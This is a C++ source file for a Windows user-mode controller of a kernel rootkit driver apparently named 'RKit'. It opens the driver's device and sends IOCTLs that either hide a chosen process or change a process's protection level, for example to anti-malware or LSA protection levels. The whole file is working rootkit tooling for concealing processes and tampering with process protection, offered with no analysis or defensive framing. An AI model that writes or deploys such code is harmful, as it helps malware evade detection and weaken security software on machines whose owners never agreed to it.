#include <Windows.h>
#include <iostream>

#define HIDE_PROC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x3, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define CHNG_PROT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x4, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct {
	int pid;
	int protLevel;
} ProtectLevel;

int main() {

	int pid, userChoice = 0;
	ProtectLevel change_level;
	HANDLE deviceObject;
	
	std::cout << "1. Hide Process\n" << "2. Change Protection Level\n" << "Choose one of the options above to apply: ";
	std::cin >> userChoice;

	if (userChoice == 1){
		std::cout << "Please enter pid: ";
		std::cin >> pid;
		std::cout << "\n";

	}
	else if (userChoice == 2) {

		std::cout << "Please enter pid: ";
		std::cin >> change_level.pid;
		std::cout << "\n";

		std::cout << "0. PS_PROTECTED_SYSTEM\n"
			"1. PS_PROTECTED_WINTCB\n"
			"2. PS_PROTECTED_WINDOWS\n"
			"3. PS_PROTECTED_AUTHENTICODE\n"
			"4. PS_PROTECTED_WINTCB_LIGHT\n"
			"5. PS_PROTECTED_WINDOWS_LIGHT\n"
			"6. PS_PROTECTED_LSA_LIGHT\n"
			"7. PS_PROTECTED_ANTIMALWARE_LIGHT\n"
			"8. PS_PROTECTED_AUTHENTICODE_LIGHT\n\n";

		std::cout << "Please desired protection level: ";
		std::cin >> change_level.protLevel;
		std::cout << "\n";

		if (change_level.protLevel < 0 || change_level.protLevel > 8) {
			std::cout << "You have entered wrong Protection Level!\n";
			return -1;
		}
	}
	else {
		std::cout << "You entered invalid option!\n";
		return -1;
	}

	deviceObject = CreateFile(L"\\\\.\\RKit", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (deviceObject == INVALID_HANDLE_VALUE) {
		std::cout << "Device cannot be opened!\n";
		return -1;
	}

	std::cout << "Device is opened!\n";

	if (userChoice == 1) {

		int driverOutput = 0;

		if (DeviceIoControl(deviceObject, HIDE_PROC, &pid, sizeof(int), &driverOutput, sizeof(int), 0, NULL)) {
			std::cout << "IOCTL " << std::hex << HIDE_PROC << std::dec << " is sent!\n";
		}
		else {
			std::cout << "FAILED to send" << std::hex << HIDE_PROC << std::dec << " code!\n";
			return -1;
		}

		if (driverOutput) {
			std::cout << "The process with pid " << pid << " has been hidden!\n";
		}

	}

	else if (userChoice == 2) {
		
		int driverOutput = 0;

		if (DeviceIoControl(deviceObject, CHNG_PROT, &change_level, sizeof(change_level), &driverOutput, sizeof(int), 0, NULL)) {
			std::cout << "IOCTL " << std::hex << CHNG_PROT << std::dec << " is sent!\n";
		}
		else {
			std::cout << "FAILED to send" << std::hex << CHNG_PROT << std::dec << " code!\n";
			return -1;
		}
		
		if (driverOutput) {
			std::cout << "The protection level of " << change_level.pid << " is turned into " << change_level.protLevel << " !\n";
		}
	}
	
	CloseHandle(deviceObject);

	system("pause");
	return 0;
}